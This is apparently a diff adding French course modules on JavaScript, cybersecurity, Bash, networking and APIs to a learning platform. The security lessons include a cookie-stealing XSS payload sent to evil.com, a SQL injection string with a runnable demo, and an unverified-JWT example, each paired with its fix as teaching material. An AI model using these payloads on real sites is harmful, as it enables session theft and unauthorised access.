+// Dans les paramètres de fonction (très utilisé avec React)
+function afficherUser({ nom, age }) {
+  console.log(`${nom} a ${age} ans`);
+}
+afficherUser(utilisateur);
+
+
+// ============================================================
+// 2. SPREAD & REST OPERATOR
+// ============================================================
+
+// Spread : déployer
+const base = { theme: 'dark', lang: 'fr' };
+const config = { ...base, lang: 'en', debug: true };  // Surcharge lang
+// { theme: 'dark', lang: 'en', debug: true }
+
+// Cloner sans référence (erreur classique des débutants)
+const original = [1, 2, 3];
+const copieRef = original;       // ❌ Même référence ! Modifier l'un modifie l'autre.
+const copiePropre = [...original]; // ✅ Nouvelle copie indépendante
+
+
+// ============================================================
+// 3. ASYNC/AWAIT — Maîtriser l'asynchrone
+// ============================================================
+
+// Le problème du callback hell (ce qu'on évite)
+// getData(function(result) {
+//   processData(result, function(processed) {
+//     saveData(processed, function(saved) {
+//       console.log(saved); // Le "Christmas Tree" de l'enfer
+//     });
+//   });
+// });
+
+// La solution moderne : async/await
+async function chargerProfilUtilisateur(userId) {
+  try {
+    // await suspend l'exécution jusqu'à la résolution
+    const response = await fetch(`/api/users/${userId}`);
+    
+    // Vérifier que la requête a réussi
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+    }
+    
+    const user = await response.json();
+    const orders = await fetch(`/api/orders?userId=${userId}`);
+    const ordersData = await orders.json();
+    
+    return { user, orders: ordersData };
+  } catch (error) {
+    console.error('Erreur de chargement:', error.message);
+    return null;
+  }
+}
+
+// Exécution en parallèle (plus performant quand les requêtes sont indépendantes)
+async function chargerDashboard(userId) {
+  const [user, orders, notifications] = await Promise.all([
+    fetch(`/api/users/${userId}`).then(r => r.json()),
+    fetch(`/api/orders?userId=${userId}`).then(r => r.json()),
+    fetch(`/api/notifications?userId=${userId}`).then(r => r.json())
+  ]);
+  // Les 3 requêtes partent en même temps !
+  return { user, orders, notifications };
+}
+
+
+// ============================================================
+// 4. MÉTHODES DE TABLEAU MODERNES
+// ============================================================
+
+const produits = [
+  { id: 1, nom: 'Laptop', prix: 999, stock: 5 },
+  { id: 2, nom: 'Souris', prix: 29,  stock: 0 },
+  { id: 3, nom: 'Écran',  prix: 399, stock: 3 },
+];
+
+// filter → Garder les produits en stock
+const disponibles = produits.filter(p => p.stock > 0);
+// [Laptop, Écran]
+
+// map → Transformer (ici, ajouter le prix TTC)
+const avecTTC = produits.map(p => ({ ...p, prixTTC: p.prix * 1.20 }));
+
+// reduce → Agréger (total du panier)
+const total = produits.reduce((acc, p) => acc + p.prix, 0);
+// 1427
+
+// find → Premier résultat qui correspond
+const laptop = produits.find(p => p.nom === 'Laptop');
+
+// Chaîner les opérations (style fonctionnel)
+const totalDisponibles = produits
+  .filter(p => p.stock > 0)
+  .map(p => p.prix)
+  .reduce((acc, prix) => acc + prix, 0);
+// 1398 (999 + 399)
+
+console.log('Total des produits disponibles:', totalDisponibles, '€');
+      """
+    }
+    quiz {
+      question "Pourquoi `const user = fetchUserFromAPI()` ne retourne-t-il pas les données utilisateur directement ?" {
+        - "fetchUserFromAPI est une fonction mal écrite"
+        + "JavaScript est asynchrone : sans await, la fonction retourne une Promise non résolue immédiatement"
+        - "const empêche les fonctions async de fonctionner"
+        - "Il manque des parenthèses dans l'appel"
+      }
+      question "Quelle est la différence entre ces deux approches ?
+`await fetch(A); await fetch(B);`
+vs
+`await Promise.all([fetch(A), fetch(B)])`" {
+        - "Aucune différence en termes de performance"
+        + "Promise.all lance les deux requêtes en parallèle — c'est potentiellement deux fois plus rapide"
+        - "Promise.all est moins fiable car il peut échouer"
+        - "await séquentiel est recommandé pour éviter les erreurs"
+      }
+      question "Que fait cette ligne : `const config = { ...base, lang: 'en' }` si base contient déjà `lang: 'fr'` ?" {
+        - "Crée un tableau avec base et lang"
+        - "Lance une erreur car lang est défini deux fois"
+        + "Crée un nouvel objet copiant base, où lang est surchargé à 'en'"
+        - "Concatène les deux valeurs : 'fr-en'"
+      }
+    }
+  }
+
+}
+
+course "cybersecurity-basics" {
+  title: "Cybersécurité : Pense Comme un Hacker"
+  description: "Comprends comment les attaques fonctionnent pour mieux te défendre. Du phishing aux injections SQL, visite l'autre côté du miroir."
+  category: security
+  level: beginner
+  duration: "5h"
+  icon: Security
+  keywords: [cybersécurité, hacking, pentest, OWASP, CTF, injection, phishing]
+
+  module "mindset-hacker" {
+    title: "Penser Comme un Attaquant (Sans en Être Un)"
+    duration: 20min
+    content """
+# Le Jour Où Mon Email a Été Hacké
+
+Je n'avais rien fait de spécial. Pas ouvert un fichier suspect. Pas cliqué sur un lien bizarre. Juste utilisé le WiFi d'un café à Lyon.
+
+Deux heures plus tard, un inconnu au Nigeria commandait des pizzas avec mon compte Uber Eats.
+
+**Comment ?** Une attaque appelée *man-in-the-middle*. Sur un réseau WiFi non chiffré, n'importe qui avec les bons outils peut lire votre trafic réseau — y compris vos mots de passe sur les sites HTTP.
+
+> **La leçon :** La cybersécurité n'est pas paranoia. C'est comprendre les règles du jeu pour ne pas être le joueur naïf.
+
+---
+
+## Le Triangle CIA — La Trinité de la Sécurité
+
+Tout en sécurité informatique gravite autour de 3 piliers :
+
+```
+ Confidentialité
+
+ / \
+ / \
+ / \
+ Intégrité Disponibilité
+
+```
+
+| Pilier | Question | Exemple d'attaque |
+|---|---|---|
+| **Confidentialité** | Seules les bonnes personnes voient les données ? | Fuite de base de données, espionnage |
+| **Intégrité** | Les données n'ont pas été modifiées ? | Injection SQL, falsification de log |
+| **Disponibilité** | Le service est accessible quand on en a besoin ? | Attaque DDoS, ransomware |
+
+---
+
+## Les 5 Phases d'une Attaque (Kill Chain)
+
+Un hacker professionnel ne frappe pas au hasard. Il suit un processus :
+
+```
+1. RECONNAISSANCE → Collecter des infos (LinkedIn, WHOIS, Google Dorks)
+ ↓
+2. SCANNING → Trouver les failles (Nmap, Nessus, Shodan)
+ ↓
+3. EXPLOITATION → Exploiter la vulnérabilité
+ ↓
+4. POST-EXPLOITATION → Maintenir l'accès, pivoter
+ ↓
+5. COUVERTURE → Effacer les traces
+```
+
+Savoir comment les attaques sont structurées, c'est savoir comment les détecter et les bloquer à chaque étape.
+
+---
+
+## Les Types d'Hackers (Chapeaux)
+
+```
+ Black Hat → Motivé par le gain ou la destruction. Illégal.
+ White Hat → Pentesters légitimes, payés pour trouver des failles.
+ Grey Hat → Entre les deux : trouve les failles sans autorisation,
+ mais les signale plutôt qu'exploiter.
+ Script Kid → Utilise des outils sans comprendre. Le plus dangereux
+ car imprévisible.
+```
+
+**Ton objectif en suivant ce cours :** devenir White Hat — comprendre les attaques pour les prévenir.
+    """
+    codeblock "bash" {
+      title: "OSINT — reconnaissance sur votre propre périmètre"
+      code """
+# L'OSINT (Open Source INTelligence) c'est collecter des infos
+# à partir de sources publiques. Fais-le sur toi-même d'abord !
+
+# 1. Ce que Google sait sur ton domaine
+# Tape dans Google :
+site:tondomaine.fr           # Toutes les pages indexées
+site:tondomaine.fr filetype:pdf  # Les PDFs exposés
+"tondomaine.fr" password      # Mentions avec 'password' (data leaks)
+
+# 2. Vérifier si tes emails ont fuité
+# Utilise : https://haveibeenpwned.com
+# (ou vérifie offline avec des dumps locaux)
+
+# 3. Informations WHOIS sur un domaine
+whois exemple.fr
+# Révèle : propriétaire, emails, dates d'expiration
+
+# 4. Trouver les sous-domaines exposés
+# Enumération passive avec des outils légaux
+dig tondomaine.fr ANY
+host -t mx tondomaine.fr    # Serveurs mail
+host -t ns tondomaine.fr    # Serveurs DNS
+
+# 5. Ce que Shodan (le Google des serveurs) révèle
+# Shodan.io - cherche : 'org:"Nom de ta boîte"'
+# Tu verras tous tes services exposés sur internet
+
+# ⚠️ RÈGLE D'OR : Ne fais JAMAIS ça sur des systèmes
+# qui ne t'appartiennent pas sans autorisation écrite.
+      """
+    }
+    quiz {
+      question "Qu'est-ce que le triangle CIA en cybersécurité ?" {
+        - "Central Intelligence Agency, FBI, NSA"
+        + "Confidentialité, Intégrité, Disponibilité"
+        - "Chiffrement, Identification, Authentification"
+        - "Contrôle, Inspection, Audit"
+        explanation "Le CIA triad est le fondement de toute politique de sécurité : protéger la confidentialité des données, garantir leur intégrité et assurer la disponibilité des services."
+      }
+      question "Quelle est la première phase d'une cyberattaque structurée ?" {
+        - "L'exploitation directe"
+        - "L'installation d'un malware"
+        + "La reconnaissance (collecte d'infos)"
+        - "L'effacement des traces"
+      }
+      question "Un 'White Hat' hacker est..." {
+        - "Un criminel informatique déguisé en bon"
+        + "Un pentester légal, payé pour trouver des failles"
+        - "Quelqu'un qui utilise des outils sans les comprendre"
+        - "Un hacker anonyme sans affiliation"
+      }
+    }
+  }
+
+  module "owasp-top10" {
+    title: "OWASP Top 10 : Les 10 Failles qui Font des Ravages"
+    duration: 30min
+    content """
+# OWASP Top 10 — Le Palmarès des Catastrophes
+
+L'OWASP (Open Web Application Security Project) publie chaque année le Top 10 des vulnérabilités les plus critiques. Ce n'est pas de la théorie : ces failles ont causé des milliards d'euros de dégâts.
+
+---
+
+## #1 — Injection (SQL, NoSQL, OS, LDAP)
+
+La reine des vulnérabilités. Simple à comprendre, dévastatrice en pratique.
+
+```sql
+-- Application vulnérable : construction de requête par concaténation
+SELECT * FROM users WHERE username = '" + username + "'
+
+-- Attaque : l'utilisateur saisit comme nom :
+admin' OR '1'='1
+
+-- La requête devient :
+SELECT * FROM users WHERE username = 'admin' OR '1'='1'
+-- ↑ Toujours vrai !
+-- Résultat : accès sans mot de passe à tous les comptes.
+
+-- PROTECTION : Requêtes paramétrées (JAMAIS de concaténation)
+SELECT * FROM users WHERE username = ?
+-- Le ? est rempli par le driver, jamais interprété comme SQL.
+```
+
+## #2 — Authentification Brisée
+
+Mots de passe faibles, tokens JWT mal signés, sessions qui n'expirent jamais...
+
+```python
+# JWT mal vérifié — bug réel trouvé dans des apps prod
+import jwt
+token = jwt.decode(token, options={'verify_signature': False})
+# N'importe qui peut forger n'importe quel token !
+
+# Correct
+token = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
+```
+
+## #3 — Exposition de Données Sensibles
+
+```
+Erreurs classiques :
+→ Mots de passe en MD5 (rainbow tables en 5 min)
+→ Connexions HTTP au lieu de HTTPS
+→ Clés API dans le code source pushé sur GitHub
+→ Logs qui contiennent des numéros de carte bancaire
+
+Solution : bcrypt pour les mots de passe, chiffrement AES-256
+pour les données sensibles, audit régulier des logs.
+```
+
+## #4 — XXE (XML External Entity)
+## #5 — Contrôle d'Accès Défaillant
+
+```
+IDOR — Insecure Direct Object Reference :
+URL : /api/factures/1234 ← Ma facture
+URL : /api/factures/1235 ← La facture de quelqu'un d'autre
+
+Si l'API ne vérifie pas que l'utilisateur A a le droit
+de voir la ressource de l'utilisateur B → faille critique.
+```
+
+## #6 — Mauvaise Configuration Sécurité
+## #7 — XSS (Cross-Site Scripting)
+
+```javascript
+// Injection XSS stockée
+// Attaquant poste ce commentaire :
+<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+
+// Si l'app affiche les commentaires sans sanitisation,
+// le script s'exécute dans le navigateur de chaque visiteur.
+// Résultat : vol de session, redirection, keylogger...
+
+// Protection : échapper TOUJOURS le HTML
+const safe = text.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+// Ou mieux : utiliser des templates auto-escaping (React, Vue...)
+```
+
+## #8 — Désérialisation Non Sécurisée
+## #9 — Composants Vulnérables
+## #10 — Logs & Monitoring Insuffisants
+    """
+    codeblock "python" {
+      title: "Démonstration pédagogique — injection SQL et protection"
+      code """
+import sqlite3
+import re
+
+# === DÉMONSTRATION PÉDAGOGIQUE (NE JAMAIS FAIRE EN PROD) ===
+
+def connexion_vulnerable(username: str) -> str:
+    """Version DANGEREUSE - ne jamais utiliser"""
+    conn = sqlite3.connect(':memory:')
+    conn.execute("CREATE TABLE users (id INT, username TEXT, role TEXT)")
+    conn.execute("INSERT INTO users VALUES (1, 'alice', 'admin')")
+    conn.execute("INSERT INTO users VALUES (2, 'bob', 'user')")
+    conn.commit()
+    
+    # ❌ Concaténation directe = injection possible
+    query = f"SELECT * FROM users WHERE username = '{username}'"
+    print(f"Requête : {query}")
+    result = conn.execute(query).fetchall()
+    return result
+
+def connexion_securisee(username: str) -> str:
+    """Version SÉCURISÉE - toujours faire ainsi"""
+    conn = sqlite3.connect(':memory:')
+    conn.execute("CREATE TABLE users (id INT, username TEXT, role TEXT)")
+    conn.execute("INSERT INTO users VALUES (1, 'alice', 'admin')")
+    conn.commit()
+    
+    # ✅ Requête paramétrée : le ? n'est jamais interprété comme SQL
+    query = "SELECT * FROM users WHERE username = ?"
+    result = conn.execute(query, (username,)).fetchall()
+    return result
+
+# Test normal
+print("=== Test normal ===")
+print(connexion_vulnerable('alice'))    # Fonctionne
+
+# Test injection
+print("\n=== Injection SQL ===")
+payload = "alice' OR '1'='1"
+print(connexion_vulnerable(payload))   # DANGER : retourne tous les users !
+
+print("\n=== Version sécurisée ===")
+print(connexion_securisee(payload))    # Retourne [] - aucun résultat. Safe !
+      """
+    }
+    quiz {
+      question "Quelle est la protection principale contre les injections SQL ?" {
+        - "Valider que l'input ne contient pas d'apostrophes"
+        + "Utiliser des requêtes paramétrées (prepared statements)"
+        - "Chiffrer la base de données"
+        - "Utiliser uniquement des procédures stockées"
+        explanation "Les requêtes paramétrées séparent le code SQL des données, rendant toute injection impossible car l'entrée utilisateur n'est jamais interprétée comme du SQL."
+      }
+      question "Qu'est-ce qu'une attaque XSS ?" {
+        - "Injection de code SQL dans une base de données"
+        + "Injection de script malveillant dans une page vue par d'autres utilisateurs"
+        - "Interception du trafic réseau chiffré"
+        - "Devinette de mot de passe par force brute"
+      }
+    }
+  }
+
+}
+
+course "bash-scripting" {
+  title: "Bash : Automatise Tout, Ne Fais Plus Rien"
+  description: "Scripts puissants pour automatiser tes tâches répétitives. Boucles, conditions, fonctions, cron jobs — deviens le maître du shell."
+  category: linux
+  level: intermediate
+  duration: "4h30"
+  icon: Terminal
+  keywords: [bash, scripting, automatisation, cron, shell, devops]
+
+  module "premier-script" {
+    title: "Ton Premier Script qui Fait Quelque Chose d'Utile"
+    duration: 25min
+    content """
+# La Nuit Où un Script m'a Économisé 4 Heures
+
+Chaque lundi matin, même rituel : copier 47 fichiers de logs depuis 3 serveurs, les renommer avec la date, les compresser, et les envoyer par email à mon chef.
+
+**45 minutes de travail manuel. Chaque semaine. Pendant 8 mois.**
+
+Un soir, épuisé, j'ai passé 2 heures à écrire un script Bash. Maintenant ça tourne tout seul à 7h du matin via cron. Mon chef reçoit ses logs. Moi, je dors.
+
+> **Le temps d'automatiser quelque chose est toujours rentabilisé.**
+
+---
+
+## Anatomie d'un Script Bash Solide
+
+```bash
+#!/bin/bash
+# ↑ Le Shebang : dit au système quel interpréteur utiliser
+# Toujours la première ligne. Toujours.
+
+# ============================================================
+# Nom : backup_logs.sh
+# Auteur : Alice Martin
+# Date : 2024-01-15
+# Usage : ./backup_logs.sh [--dry-run]
+# ============================================================
+
+# === CONFIGURATION (facile à modifier) ===
+SOURCE_DIR="/var/log/nginx"
+DEST_DIR="/backup/logs"
+RETENTION_JOURS=30
+DATE=$(date +%Y-%m-%d) # Format : 2024-01-15
+
+# === MODE STRICT (détecte les erreurs) ===
+set -euo pipefail
+# -e : stoppe si une commande échoue
+# -u : erreur si variable non définie
+# -o pipefail : erreur si une commande dans un pipe échoue
+
+# === FONCTIONS ===
+log() { echo "[$(date '+%H:%M:%S')] $*"; }
+error() { echo " ERREUR: $*" >&2; exit 1; }
+
+# === VÉRIFICATIONS ===
+[[ -d "$SOURCE_DIR" ]] || error "Dossier source inexistant : $SOURCE_DIR"
+[[ -d "$DEST_DIR" ]] || mkdir -p "$DEST_DIR"
+
+# === LOGIQUE PRINCIPALE ===
+log "Démarrage backup logs..."
+
+# Copie et compression
+tar -czf "$DEST_DIR/logs-$DATE.tar.gz" -C "$SOURCE_DIR" .
+log "Archive créée : logs-$DATE.tar.gz"
+
+# Nettoyage des vieux backups
+find "$DEST_DIR" -name "*.tar.gz" -mtime +$RETENTION_JOURS -delete
+log "Nettoyage : backups de plus de $RETENTION_JOURS jours supprimés"
+
+log " Backup terminé avec succès"
+```
+
+---
+
+## Variables : Les Règles d'Or
+
+```bash
+# Déclaration (pas d'espaces autour du =)
+NOM="Alice" # Correct
+NOM = "Alice" # Erreur de syntaxe !
+
+# Utilisation : toujours entre guillemets
+echo "Bonjour $NOM" # Simple
+echo "Fichier : ${NOM}_config" # Avec texte collé : utiliser {}
+
+# Variables spéciales indispensables
+echo $0 # Nom du script
+echo $1 # Premier argument
+echo $# # Nombre d'arguments
+echo $? # Code retour de la dernière commande (0=succès)
+echo $$ # PID du script courant
+echo $@ # Tous les arguments
+
+# Sous-shell : capturer la sortie d'une commande
+DATE=$(date +%Y-%m-%d) # Méthode moderne 
+DATE=`date +%Y-%m-%d` # Ancienne méthode (à éviter)
+
+NB_FICHIERS=$(ls /etc | wc -l)
+echo "Il y a $NB_FICHIERS fichiers dans /etc"
+```
+    """
+    codeblock "bash" {
+      title: "Script complet — moniteur de santé système"
+      code """
+#!/bin/bash
+# health_check.sh — Rapport de santé système en couleurs
+
+# Couleurs ANSI
+ROUGE='\033[0;31m'
+VERT='\033[0;32m'
+JAUNE='\033[1;33m'
+BLEU='\033[0;34m'
+RESET='\033[0m'
+
+# Seuils d'alerte
+SEUIL_CPU=80
+SEUIL_RAM=85
+SEUIL_DISQUE=90
+
+statut() {
+    local valeur=$1
+    local seuil=$2
+    if (( valeur >= seuil )); then
+        echo -e "${ROUGE}⚠️  CRITIQUE${RESET}"
+    elif (( valeur >= seuil - 15 )); then
+        echo -e "${JAUNE}⚡ ATTENTION${RESET}"
+    else
+        echo -e "${VERT}✅ OK${RESET}"
+    fi
+}
+
+echo -e "${BLEU}╔════════════════════════════════════╗${RESET}"
+echo -e "${BLEU}║  RAPPORT SANTÉ SYSTÈME             ║${RESET}"
+echo -e "${BLEU}║  $(date '+%d/%m/%Y %H:%M:%S')          ║${RESET}"
+echo -e "${BLEU}╚════════════════════════════════════╝${RESET}"
+echo
+
+# CPU (sur 1 minute)
+CPU=$(top -bn1 | grep 'Cpu(s)' | awk '{print int($2)}')
+echo -e "CPU Usage     : ${CPU}%   $(statut $CPU $SEUIL_CPU)"
+
+# RAM
+RAM_TOTAL=$(free | awk '/^Mem:/{print $2}')
+RAM_USED=$(free | awk '/^Mem:/{print $3}')
+RAM_PCT=$(( RAM_USED * 100 / RAM_TOTAL ))
+echo -e "RAM Usage     : ${RAM_PCT}%   $(statut $RAM_PCT $SEUIL_RAM)"
+
+# Disque (partition principale)
+DISQUE=$(df / | awk 'NR==2{print int($5)}')
+echo -e "Disk Usage    : ${DISQUE}%   $(statut $DISQUE $SEUIL_DISQUE)"
+
+# Charge système
+LOAD=$(uptime | awk -F'[a-z]:' '{print $2}' | tr -d ' ' | cut -d, -f1)
+echo -e "Load Average  : $LOAD"
+
+# Uptime
+echo -e "Uptime        : $(uptime -p)"
+
+# Top 3 processus CPU
+echo
+echo -e "${BLEU}Top 3 processus CPU :${RESET}"
+ps aux --sort=-%cpu | awk 'NR>1 && NR<=4 {printf "  %-20s %5s%%\n", $11, $3}'
+
+echo
+echo "Rapport généré. Bonne journée !"
+      """
+    }
+    quiz {
+      question "Que signifie 'set -euo pipefail' dans un script Bash ?" {
+        - "Active le mode debug avec affichage de chaque commande"
+        + "Stoppe le script sur erreur, interdit les variables non définies, propage les erreurs de pipe"
+        - "Rend le script exécutable automatiquement"
+        - "Définit le niveau de logs à 'error'"
+        explanation "C'est une bonne pratique fondamentale : -e stoppe à la première erreur, -u interdit les variables indéfinies, -o pipefail propage les erreurs dans les pipes."
+      }
+      question "Quelle est la syntaxe correcte pour capturer la sortie d'une commande dans une variable ?" {
+        - "DATE = date +%Y-%m-%d"
+        + "DATE=$(date +%Y-%m-%d)"
+        - "DATE=[date +%Y-%m-%d]"
+        - "$DATE = date +%Y-%m-%d"
+      }
+      question "Que contient la variable spéciale $? en Bash ?" {
+        - "Le PID du processus courant"
+        - "Le nombre d'arguments passés au script"
+        + "Le code retour de la dernière commande exécutée"
+        - "Le nom du script en cours"
+      }
+    }
+  }
+
+  module "cron-automatisation" {
+    title: "Cron Jobs : Programmer le Futur"
+    duration: 20min
+    content """
+# ⏰ Cron : Le Planificateur Silencieux
+
+Cron est l'outil qui fait tourner Internet pendant que tout le monde dort. Sauvegardes nocturnes, rapports hebdomadaires, nettoyages automatiques — tout ça, c'est du cron.
+
+---
+
+## Syntaxe Cron : 5 Champs, Puissance Infinie
+
+```
+ Minute (0-59)
+ Heure (0-23)
+ Jour mois (1-31)
+ Mois (1-12)
+ Jour semaine (0-7, 0 et 7 = dimanche)
+
+* * * * * commande
+
+Exemples :
+0 2 * * * → Tous les jours à 2h00
+*/15 * * * * → Toutes les 15 minutes
+0 9 * * 1 → Chaque lundi à 9h00
+0 0 1 * * → Le 1er de chaque mois à minuit
+30 18 * * 1-5 → Lundi-vendredi à 18h30
+@reboot → Au démarrage du système
+@daily → Équivalent à '0 0 * * *'
+```
+
+---
+
+## Éditer et Gérer les Cron Jobs
+
+```bash
+crontab -e # Éditer votre crontab
+crontab -l # Lister vos cron jobs
+crontab -r # Supprimer TOUT (attention !)
+
+# Logs des exécutions cron :
+tail -f /var/log/syslog | grep CRON
+
+# Exemple de crontab complète :
+# Backup quotidien à 3h du matin
+0 3 * * * /home/alice/scripts/backup.sh >> /var/log/backup.log 2>&1
+
+# Nettoyage hebdomadaire le dimanche à minuit
+0 0 * * 0 find /tmp -mtime +7 -delete
+
+# Rapport de santé toutes les heures
+0 * * * * /home/alice/scripts/health_check.sh | mail -s "Santé Serveur" admin@tutodecode.fr
+```
+    """
+    codeblock "bash" {
+      title: "Script — rotation automatique de logs"
+      code """
+#!/bin/bash
+# rotate_logs.sh — À planifier avec cron : 0 0 * * * /scripts/rotate_logs.sh
+
+set -euo pipefail
+
+LOG_DIR="/var/log/mon-app"
+ARCHIVE_DIR="/archives/logs"
+RETENTION=30  # jours
+
+mkdir -p "$ARCHIVE_DIR"
+
+# Compresser les logs du jour précédent
+HIER=$(date -d 'yesterday' +%Y-%m-%d)
+
+if ls "$LOG_DIR"/*.log 2>/dev/null | head -1 > /dev/null; then
+    # Créer archive
+    tar -czf "$ARCHIVE_DIR/logs-$HIER.tar.gz" -C "$LOG_DIR" .
+    
+    # Vider les fichiers log (pas les supprimer, car l'app peut écrire dessus)
+    find "$LOG_DIR" -name "*.log" -exec truncate -s 0 {} \;
+    
+    echo "[$(date)] Archive créée : logs-$HIER.tar.gz"
+fi
+
+# Supprimer les archives trop vieilles
+NB_SUPPRIMES=$(find "$ARCHIVE_DIR" -name "*.tar.gz" -mtime +$RETENTION | wc -l)
+find "$ARCHIVE_DIR" -name "*.tar.gz" -mtime +$RETENTION -delete
+
+echo "[$(date)] Nettoyage : $NB_SUPPRIMES archives supprimées (>${RETENTION}j)"
+echo "[$(date)] Rotation terminée."
+      """
+    }
+    quiz {
+      question "Que fait l'entrée cron suivante : '*/5 9-18 * * 1-5' ?" {
+        - "Toutes les 5 minutes, 24h/24, du lundi au vendredi"
+        + "Toutes les 5 minutes entre 9h et 18h, du lundi au vendredi"
+        - "À 5h09 et 5h18, du lundi au vendredi"
+        - "Le 5ème jour à 9h18, les jours 1 à 5 du mois"
+        explanation "*/5 = toutes les 5 minutes, 9-18 = entre 9h et 18h, * * = tous les mois et jours du mois, 1-5 = du lundi au vendredi."
+      }
+    }
+  }
+
+}
+
+course "networking-fundamentals" {
+  title: "Réseaux : Du Câble à Internet en 1h"
+  description: "Comment fonctionne vraiment Internet ? IP, TCP, DNS, HTTP, TLS — décortique chaque protocole avec des analogies du monde réel."
+  category: network
+  level: beginner
+  duration: "4h"
+  icon: NetworkCheck
+  keywords: [réseau, TCP/IP, DNS, HTTP, protocoles, routage, subnet, OSI]
+
+  module "modele-osi" {
+    title: "Le Modèle OSI : La Tour de Babel du Réseau"
+    duration: 25min
+    content """
+# La Lettre qui Traverse le Monde
+
+Imagine que tu veuilles envoyer une lettre à quelqu'un en Australie. Ce n'est pas magique — ça suit un processus précis : tu écris (contenu), tu mets dans une enveloppe (emballage), tu indiques l'adresse (routage), La Poste prend le relais (transport), l'avion traverse les océans (physique).
+
+Internet, c'est exactement pareil. Et le modèle OSI en est la carte.
+
+---
+
+## Les 7 Couches OSI (Mémo : PDN-TSAR)
+
+```
+
+ 7. APPLICATION HTTP, FTP, DNS, SMTP, SSH 
+ "L'app que l'utilisateur voit" 
+
+ 6. PRÉSENTATION Chiffrement TLS, compression 
+ "Traduire et chiffrer" 
+
+ 5. SESSION Gestion des connexions 
+ "Ouvrir et maintenir la conversation" 
+
+ 4. TRANSPORT TCP (fiable), UDP (rapide) 
+ "Garantir la livraison des paquets" 
+
+ 3. RÉSEAU IP, routage, ICMP 
+ "Trouver le chemin à travers l'internet" 
+
+ 2. LIAISON Ethernet, WiFi, MAC addresses 
+ "Communiquer sur le réseau local" 
+
+ 1. PHYSIQUE Câbles, fibres, ondes radio 
+ "Les bits voyagent sur du cuivre ou de la lumière"
+
+```
+
+**Quand tu ouvres YouTube :**
+```
+Ton navigateur demande la vidéo → Couche 7 (HTTP)
+TLS chiffre la communication → Couche 6
+TCP ouvre une connexion → Couche 4
+Ta box trouve la route vers YouTube → Couche 3
+Le WiFi transporte les paquets → Couche 2
+Les ondes radio voyagent → Couche 1
+```
+
+---
+
+## TCP vs UDP : Le Choix Fondamental
+
+```
+TCP (Transmission Control Protocol)
+→ Fiable : chaque paquet est accusé de réception
+→ Ordonné : les paquets arrivent dans l'ordre d'envoi
+→ Lent : overhead du handshake + retransmissions
+→ Usages : HTTP/HTTPS, emails, SSH, transfert de fichiers
+
+UDP (User Datagram Protocol)
+→ Non fiable : fire & forget, pas d'accusé de réception
+→ Non ordonné : les paquets peuvent arriver dans n'importe quel ordre
+→ Rapide : zéro overhead
+→ Usages : streaming vidéo, jeux en ligne, DNS, VoIP
+
+Analyse :
+TCP = lettre recommandée avec accusé de réception
+UDP = tract glissé sous la porte — peut-être lu, peut-être pas
+```
+
+---
+
+## Le 3-Way Handshake TCP
+
+```
+Client Serveur
+
+ SYN "Je veux me connecter"
+
+ SYN-ACK "OK, je suis prêt"
+
+ ACK "Parfait, on peut parler"
+
+ [ DONNÉES ] 
+
+```
+
+Avant chaque connexion TCP (HTTP, SSH, SMTP...), ce dialogue de 3 messages s'effectue. C'est pour ça que la latence compte : un aller-retour supplémentaire avant même de transférer quoi que ce soit.
+    """
+    codeblock "bash" {
+      title: "Explorer les couches réseau en temps réel"
+      code """
+# === COUCHE 1 & 2 : Interface réseau ===
+ip link show                    # Interfaces réseau (eth0, wlan0...)
+ip addr show                    # Adresses IP de chaque interface
+arp -n                          # Table ARP : MAC ↔ IP sur le réseau local
+
+# === COUCHE 3 : Routage IP ===
+ip route show                   # Table de routage de votre machine
+# Lisez : "default via 192.168.1.1" = votre gateway par défaut
+
+traceroute google.com           # Suit le chemin paquet par paquet
+# Chaque ligne = un routeur traversé + sa latence
+
+# === COUCHE 4 : Connexions TCP/UDP actives ===
+ss -tulpn                       # Toutes les connexions + le programme
+# t=TCP, u=UDP, l=listening, p=process, n=no résolution
+
+# Voir les connexions établies
+ss -tnp state established
+
+# === COUCHE 7 : Test HTTP brut (sans navigateur) ===
+# On simule un navigateur à la main
+curl -v https://tutodecode.fr 2>&1 | head -40
+# -v = verbose : voir tout le handshake TLS + headers HTTP
+
+# DNS : résolution de nom (couche 7)
+dig tutodecode.fr               # Requête DNS complète avec détails
+dig tutodecode.fr +short        # Juste l'IP
+nslookup tutodecode.fr          # Alternatif plus simple
+
+# Voir le TTL des paquets
+ping -c 3 8.8.8.8
+# TTL=118 → les paquets ont traversé environ 5 routeurs (128-118=10... non, TTL Linux par défaut = 64)
+      """
+    }
+    quiz {
+      question "Quelle est la différence principale entre TCP et UDP ?" {
+        - "TCP est plus rapide, UDP est plus fiable"
+        + "TCP garantit la livraison dans l'ordre, UDP est rapide mais sans garantie"
+        - "TCP fonctionne en WiFi, UDP en câble Ethernet"
+        - "TCP est pour les serveurs, UDP pour les clients"
+      }
+      question "Combien d'étapes comporte le TCP 3-Way Handshake ?" {
+        - "2 (SYN + ACK)"
+        - "4 (SYN + SYN-ACK + ACK + DATA)"
+        + "3 (SYN + SYN-ACK + ACK)"
+        - "1 (CONNECTION)"
+        explanation "SYN → SYN-ACK → ACK. Ces 3 étapes sont obligatoires avant tout échange de données en TCP."
+      }
+      question "Sur quelle couche OSI fonctionne le protocole IP ?" {
+        - "Couche 2 - Liaison"
+        + "Couche 3 - Réseau"
+        - "Couche 4 - Transport"
+        - "Couche 7 - Application"
+      }
+    }
+  }
+
+}
+
+course "api-rest" {
+  title: "APIs REST : Construire le Web Moderne"
+  description: "Comprends et construis des APIs REST professionnelles. JSON, HTTP verbs, authentification, rate limiting — de consommateur à créateur."
+  category: web
+  level: beginner
+  duration: "4h"
+  icon: Api
+  keywords: [API, REST, HTTP, JSON, backend, web, CRUD, authentification]
+
+  module "qu-est-ce-api" {
+    title: "Une API c'est Quoi ? La Métaphore du Serveur de Restaurant"
+    duration: 20min
+    content """
+# L'API, c'est le Serveur au Restaurant
+
+Tu es client dans un restaurant (ton application). Tu ne vas pas en cuisine préparer ton repas toi-même (la base de données). À la place, tu appelles le **serveur** — l'API — qui prend ta commande, va en cuisine, et te rapporte exactement ce que tu as demandé.
+
+```
+Client (app mobile) → API REST → Base de données
+ "Je veux la liste des cours" → SELECT * FROM courses
+ ← [{id: 1, title: 'Linux'}, ...] ←
+```
+
+---
+
+## Les 4 Verbes HTTP : CRUD
+
+```
+GET → Lire/Récupérer (R - Read)
+POST → Créer (C - Create)
+PUT → Remplacer (U - Update complet)
